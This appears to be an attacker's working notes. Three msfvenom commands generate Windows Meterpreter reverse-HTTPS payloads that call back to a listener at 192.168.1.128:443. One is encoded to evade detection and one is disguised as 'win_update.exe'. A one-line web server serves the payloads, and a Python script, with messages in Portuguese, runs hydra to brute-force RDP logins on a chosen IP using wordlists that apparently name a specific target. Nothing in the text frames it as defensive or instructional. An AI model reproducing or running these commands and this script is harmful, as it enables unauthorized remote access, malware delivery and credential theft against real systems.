msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

#!/usr/bin/env python3
import os
import subprocess

def brute_force_rdp(target_ip, userlist, passlist):
    print(f"[+] Iniciando brute force no RDP ({target_ip}:3389)...")
    hydra_command = [
        'hydra', '-t', '4', '-V', '-f', '-u',
        '-L', userlist,
        '-P', passlist,
        f'rdp://{target_ip}'
    ]
    subprocess.run(hydra_command)

if __name__ == "__main__":
    userlist_path = "./userlist_atibaia_rdp.txt"
    passlist_path = "./wordlist_atibaia_vnc.txt"  # reaproveitando a mesma wordlist de senhas

    if not os.path.exists(userlist_path):
        print("[!] Lista de usuários não encontrada. Coloque o arquivo na mesma pasta com o nome 'userlist_atibaia_rdp.txt'")
        exit(1)

    if not os.path.exists(passlist_path):
        print("[!] Wordlist de senhas não encontrada. Coloque o arquivo na mesma pasta com o nome 'wordlist_atibaia_vnc.txt'")
        exit(1)

    target_ip = input("Digite o IP do alvo RDP: ")

    brute_force_rdp(target_ip, userlist_path, passlist_path)
